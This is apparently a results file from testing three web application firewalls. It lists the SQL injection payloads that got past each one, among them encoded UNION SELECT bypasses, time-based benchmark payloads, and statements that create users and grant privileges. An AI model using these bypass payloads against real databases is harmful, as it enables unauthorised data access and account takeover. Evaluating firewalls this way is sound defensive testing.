@@ -1,0 +1,109 @@
+WAF 1
+Failed attacks: 470
+Successful attacks: 48
+number: 11 - or '1 -> syntax error
+number: 20 - '-' ->
+number: 21 - "-"
+number: 26 - 2 and 2>0
+number: 30 - 1 or 0b1
+number: 32 - 111' or _binary'1 -> all of the users
+number: 33 - 1 or 2121
+number: 35 - %55nion(%53elect)
+number: 36 - union%20distinct%20select
+number: 37 - union%20%64istinctRO%57%20select
+number: 38 - union%2053elect
+number: 41 - %55nion %53eLEct
+number: 42 - u%6eion se%6cect
+number: 43 - unio%6e %73elect
+number: 44 - unio%6e%20%64istinc%74%20%73elect
+number: 45 - uni%6fn distinct%52OW s%65lect
+number: 46 - %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74
+number: 47 - 1'1 ->You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1'' at line 1
+number: 48 - 1 exec sp_ (or exec xp_)
+number: 49 - 1 and 1=1
+number: 56 - a' 
+number: 59 - @
+number: 60 - ?
+number: 74 - 1'1
+number: 75 - 1 exec sp_ (or exec xp_)
+number: 76 - 1 and 1=1
+number: 86 -  or 1=1
+number: 141 - ||6
+number: 145 - or 1=1
+number: 196 - create user name identified by 'pass123'
+number: 197 - create user name identified by pass123 temporary tablespace temp default tablespace users; 
+number: 202 - grant connect to name; grant resource to name;
+number: 203 - insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+number: 476 -  and 0=benchmark(3000000,MD5(1))%20%23
+number: 479 - ' and 0=benchmark(3000000,MD5(1))%20%23
+number: 482 - " and 0=benchmark(3000000,MD5(1))%20%23
+number: 485 - ) and 0=benchmark(3000000,MD5(1))%20%23
+number: 488 - )) and 0=benchmark(3000000,MD5(1))%20%23
+number: 491 - ))) and 0=benchmark(3000000,MD5(1))%20%23
+number: 494 - )))) and 0=benchmark(3000000,MD5(1))%20%23
+number: 497 - ') and 0=benchmark(3000000,MD5(1))%20%23
+number: 500 - ") and 0=benchmark(3000000,MD5(1))%20%23
+number: 503 - ')) and 0=benchmark(3000000,MD5(1))%20%23
+number: 506 - ")) and 0=benchmark(3000000,MD5(1))%20%23
+number: 509 - '))) and 0=benchmark(3000000,MD5(1))%20%23
+number: 512 - "))) and 0=benchmark(3000000,MD5(1))%20%23
+number: 515 - ')))) and 0=benchmark(3000000,MD5(1))%20%23
+number: 518 - ")))) and 0=benchmark(3000000,MD5(1))%20%23
+
+XSS
+Failed attacks: 935
+Successful attacks: 0
+
+WAF 2 
+SQLi
+Failed attacks: 503
+Successful attacks: 15
+number: 8 - 1' or true# 
+number: 9 - 1" or true#
+number: 10 - 1 or true#
+number: 11 - or '1
+number: 47 - 1'1
+number: 48 - 1 exec sp_ (or exec xp_)
+number: 53 - 1or1=1
+number: 56 - a' 
+number: 59 - @
+number: 60 - ?
+number: 74 - 1'1
+number: 75 - 1 exec sp_ (or exec xp_)
+number: 80 - 1\'1
+number: 190 - @var select @var as var into temp end #
+number: 197 - create user name identified by pass123 temporary tablespace temp default tablespace users; 
+
+XSS
+Failed attacks: 935
+Successful attacks: 0
+
+WAF 3
+SQLi
+Failed attacks: 497
+Successful attacks: 21
+number: 5 - 1 or 1=1
+number: 10 - 1 or true#
+number: 18 - 1 or 1.e1=0b1010
+number: 30 - 1 or 0b1
+number: 33 - 1 or 2121
+number: 41 - %55nion %53eLEct
+number: 42 - u%6eion se%6cect
+number: 43 - unio%6e %73elect
+number: 45 - uni%6fn distinct%52OW s%65lect
+number: 46 - %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74
+number: 49 - 1 and 1=1
+number: 51 - 1 or 1=1
+number: 53 - 1or1=1
+number: 59 - @
+number: 60 - ?
+number: 62 - ? or 1=1 #
+number: 71 - 1 or 1=1
+number: 76 - 1 and 1=1
+number: 86 -  or 1=1
+number: 145 - or 1=1
+number: 155 - or 1=1#
+
+XSS	
+Failed attacks: 935
+Successful attacks: 0
